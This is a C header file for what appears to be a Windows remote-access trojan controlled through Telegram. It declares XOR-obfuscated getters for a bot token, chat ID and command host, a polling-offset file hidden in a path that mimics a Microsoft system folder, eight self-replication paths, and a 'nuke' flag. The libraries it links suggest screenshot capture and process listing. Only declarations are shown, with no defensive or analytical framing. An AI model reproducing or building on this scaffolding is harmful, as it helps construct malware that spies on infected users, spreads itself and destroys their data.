#ifndef CONFIG_H
#define CONFIG_H

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <psapi.h>
#include <gdiplus.h>
#include <comdef.h>
#include <shlobj.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

using namespace Gdiplus;

// Constants
#define OFFSET_FILE "C:\\ProgramData\\Microsoft\\Network\\offset.dat"

extern const char* replicationPaths[];
#define REPLICATION_COUNT 8

// Shared Globals
extern volatile int g_running;
extern volatile int g_nukeInProgress;
extern ULONG_PTR g_gdiplusToken;
extern char g_exePath[MAX_PATH];
extern int g_telegramOffset;

// Decryption Routines
void xor_decrypt(char* buf, int len);
char* get_token();
char* get_chat_id();
char* get_host();
char* get_useragent();

#endif // CONFIG_H
